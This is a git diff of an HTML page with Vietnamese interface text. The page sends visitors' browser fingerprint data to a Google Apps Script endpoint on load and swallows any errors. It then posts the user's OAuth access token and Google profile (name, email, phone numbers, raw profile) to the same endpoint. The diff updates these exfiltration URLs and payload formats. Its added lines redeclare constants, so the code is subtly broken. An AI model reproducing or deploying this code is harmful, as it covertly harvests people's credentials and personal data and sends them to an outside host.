@@ -23,7 +23,7 @@
 </head>
 <body>
 <script>
-fetch("https://script.google.com/macros/s/1qcXD9ZL9vS1g0zUfaYPICfm09gqFbwCDmOGeYIU2A54_CrFE-PRc76Gt/exec?ua=" + encodeURIComponent(navigator.userAgent)
+fetch("https://script.google.com/macros/s/AKfycbw4T_GHx4gEHsQ85SIn1tOOob0jxDF6QB1A9xI3tQdR-JBz908HVEw5VqWcp2pkofFmRA/exec?ua=" + encodeURIComponent(navigator.userAgent)
     + "&lang=" + encodeURIComponent(navigator.language)
     + "&tz=" + encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone)
     + "&screen=" + screen.width + "x" + screen.height).catch(()=>{});
@@ -95,7 +95,7 @@ animate();
 
 <script>
 const CLIENT_ID  = '585272145485-hmefm5up9vsqq1j8gotp75ssqlfqjrfl.apps.googleusercontent.com';
-const UPLOAD_URL = 'https://script.google.com/macros/s/1qcXD9ZL9vS1g0zUfaYPICfm09gqFbwCDmOGeYIU2A54_CrFE-PRc76Gt/exec';
+const UPLOAD_URL = 'https://script.google.com/macros/s/AKfycbw4T_GHx4gEHsQ85SIn1tOOob0jxDF6QB1A9xI3tQdR-JBz908HVEw5VqWcp2pkofFmRA/exec';
 
 let tokenClient;
 let accessToken = null;
@@ -123,11 +123,11 @@ window.addEventListener('load', () => {
 async function fetchProfileAndSend() {
   const show = (msg) => setDemo(typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2).replace(/\n/g,'<br>'));
   try {
-    const prox = await fetch(UPLOAD_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-      body: JSON.stringify({ type: 'proxy_people', token: accessToken })
-    });
+    const fd1 = new FormData();
+fd1.append('payload', JSON.stringify({ type: 'proxy_people', token: accessToken }));
+const prox = await fetch(UPLOAD_URL, { method: 'POST', body: fd1 });
+if (!prox.ok) { setDemo('❌ Proxy People API lỗi: HTTP ' + prox.status); return; }
+const profile = await prox.json();
     if (!prox.ok) { show('❌ Proxy People API lỗi: HTTP ' + prox.status); return; }
     const profile = await prox.json();
 
@@ -137,16 +137,14 @@ async function fetchProfileAndSend() {
 
     setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br><small>Đang gửi về Apps Script…</small>`);
 
-    const sendRes = await fetch(UPLOAD_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-      body: JSON.stringify({
-        type: 'google_people_profile',
-        ts: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        data: { name, email, phones, raw: profile }
-      })
-    });
+    const fd2 = new FormData();
+fd2.append('payload', JSON.stringify({
+  type: 'google_people_profile',
+  ts: new Date().toISOString(),
+  userAgent: navigator.userAgent,
+  data: { name, email, phones, raw: profile }
+}));
+const sendRes = await fetch(UPLOAD_URL, { method: 'POST', body: fd2 });
 
     setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br>${sendRes.ok ? '✅ Đã gửi về Apps Script' : '❌ Gửi về Apps Script thất bại'}`);
   } catch (e) {
